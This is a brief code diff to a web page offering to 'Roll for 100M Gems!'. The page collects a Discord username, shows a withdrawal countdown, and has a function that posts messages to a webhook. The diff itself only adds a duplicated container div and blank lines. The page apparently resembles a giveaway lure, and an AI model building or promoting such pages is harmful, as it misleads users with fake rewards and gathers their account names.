@@ -408,6 +408,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
         
 <div class="container night-mode">
+<div class="container night-mode">
     <h2>Roll for 100M Gems!</h2>
     
     <label for="discordUser">Your Discord Username: </label>
@@ -418,6 +419,7 @@ document.addEventListener('DOMContentLoaded', function() {
     
     <div id="rollResult">Please enter your Discord username to enable the roll button.</div>
 </div>
+
 
 <div id="countdownContainer">
     <p id="countdownText">Withdrawals will go through in <span id="countdownTime">Loading...</span></p>
@@ -626,6 +628,7 @@ function sendToWebhook(message) {
     .then(data => console.log('Success:', data))
     .catch((error) => console.error('Error:', error));
 }
+
 
 
 function updateCountdown() {
